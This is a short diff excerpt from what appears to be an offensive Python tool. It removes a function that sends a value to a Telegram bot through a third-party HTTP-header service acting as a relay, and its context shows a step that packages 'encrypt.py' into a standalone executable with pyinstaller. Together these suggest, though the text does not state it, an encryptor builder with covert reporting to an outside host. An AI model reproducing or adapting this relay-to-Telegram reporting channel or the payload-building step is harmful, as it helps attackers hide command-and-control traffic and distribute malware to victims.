@@ -70,20 +70,6 @@ def soc():
     while True:
         user()
 
-
-
-def soc2(token,id,num):
-    url = ("https://api.telegram.org/bot{token}/sendmessage?chat_id={chat_id}&text={k}".format(k=str(num),token=token,chat_id = id))
-
-    payload = {"UrlBox":url,
-               
-               "AgentList":"Mozilla Firefox",
-               "VersionList":"HTTP/1.1",
-               "MethodList":"POST"}
-    
-    
-    req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",payload)
-
 def soc3():
     os.system("pyinstaller --onefile encrypt.py")
     print(Fore.RED+"\n [!] Your Exe File Is Building!Go To /dist Folder")
